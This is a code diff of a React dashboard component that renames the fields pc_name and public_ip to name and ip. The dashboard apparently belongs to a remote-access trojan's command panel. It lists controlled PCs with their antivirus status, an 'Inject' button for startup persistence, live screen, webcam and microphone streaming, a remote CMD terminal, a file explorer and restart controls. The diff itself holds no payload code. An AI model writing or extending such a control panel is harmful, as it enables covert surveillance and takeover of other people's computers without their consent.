@@ -6,8 +6,8 @@ import { Monitor, Power, RefreshCw, ShieldAlert, Terminal, Camera, Mic, MessageS
 
 interface Computer {
   id: string;
-  pc_name: string;
-  public_ip: string;
+  name: string;
+  ip: string;
   status: 'online' | 'offline';
   startup_enabled: boolean;
   antivirus: string;
@@ -523,12 +523,12 @@ export default function Dashboard() {
             <div className="p-5">
               <div className="flex justify-between items-start mb-4">
                 <div>
-                  <h3 className="text-xl font-bold text-white group-hover:text-red-400 transition-colors flex items-center gap-2"><Monitor size={18} /> <span className="animate-gradient-title">{pc.pc_name}</span></h3>
-                  <p className="text-xs text-gray-400 mt-1">{pc.public_ip}</p>
+                  <h3 className="text-xl font-bold text-white group-hover:text-red-400 transition-colors flex items-center gap-2"><Monitor size={18} /> <span className="animate-gradient-title">{pc.name}</span></h3>
+                  <p className="text-xs text-gray-400 mt-1">{pc.ip}</p>
                 </div>
                 <div className="flex items-center gap-3">
                   <div className={`w-3 h-3 rounded-full ${isOnline(pc.last_seen) ? 'bg-green-500 shadow-[0_0_15px_#22c55e] animate-pulse' : 'bg-gray-600'}`}></div>
-                  <button onClick={() => deleteComputer(pc.id, pc.pc_name)} className="text-gray-500 hover:text-red-500 transition-colors" title="Delete PC"><X size={20} /></button>
+                  <button onClick={() => deleteComputer(pc.id, pc.name)} className="text-gray-500 hover:text-red-500 transition-colors" title="Delete PC"><X size={20} /></button>
                 </div>
               </div>
               <div className="grid grid-cols-2 gap-4 mb-6">
@@ -544,20 +544,20 @@ export default function Dashboard() {
                   <div className="flex items-center justify-between">
                     <span className={pc.startup_enabled ? 'animate-gradient-green font-bold text-sm' : 'text-gray-400 text-sm'}>{pc.startup_enabled ? 'ACTIVE' : 'NONE'}</span>
                     {pc.startup_enabled ? (
-                      <button onClick={() => sendCommand(pc.id, pc.pc_name, 'startup_remove')} className="text-[10px] bg-red-500/20 text-red-400 px-1 rounded hover:bg-red-500/40">Remove</button>
+                      <button onClick={() => sendCommand(pc.id, pc.name, 'startup_remove')} className="text-[10px] bg-red-500/20 text-red-400 px-1 rounded hover:bg-red-500/40">Remove</button>
                     ) : (
-                      <button onClick={() => sendCommand(pc.id, pc.pc_name, 'startup')} className="text-[10px] bg-green-500/20 text-green-400 px-1 rounded hover:bg-green-500/40">Inject</button>
+                      <button onClick={() => sendCommand(pc.id, pc.name, 'startup')} className="text-[10px] bg-green-500/20 text-green-400 px-1 rounded hover:bg-green-500/40">Inject</button>
                     )}
                   </div>
                 </div>
               </div>
               <div className="grid grid-cols-4 gap-2">
-                <button onClick={() => startLiveStream(pc.id, pc.pc_name)} className="col-span-3 p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center items-center gap-2 text-green-400 transition-colors font-bold" title="Live Stream (Screen, Webcam, Mic)"><Video size={18} /> Live Stream</button>
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18} /></button>
-                <button onClick={() => { setActivePC(pc.pc_name); setShowTerminal(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Open Terminal (CMD)"><Terminal size={18} /></button>
-                <button onClick={() => openExplorer(pc.id, pc.pc_name)} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="File Explorer"><Folder size={18} /></button>
-                <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setActiveModal('saved_commands'); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Saved Commands / Shortcuts"><Settings size={18} /></button>
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18} /></button>
+                <button onClick={() => startLiveStream(pc.id, pc.name)} className="col-span-3 p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center items-center gap-2 text-green-400 transition-colors font-bold" title="Live Stream (Screen, Webcam, Mic)"><Video size={18} /> Live Stream</button>
+                <button onClick={() => sendCommand(pc.id, pc.name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18} /></button>
+                <button onClick={() => { setActivePC(pc.name); setShowTerminal(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Open Terminal (CMD)"><Terminal size={18} /></button>
+                <button onClick={() => openExplorer(pc.id, pc.name)} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="File Explorer"><Folder size={18} /></button>
+                <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.name); setActiveModal('saved_commands'); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Saved Commands / Shortcuts"><Settings size={18} /></button>
+                <button onClick={() => sendCommand(pc.id, pc.name, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18} /></button>
               </div>
             </div>
           </div>
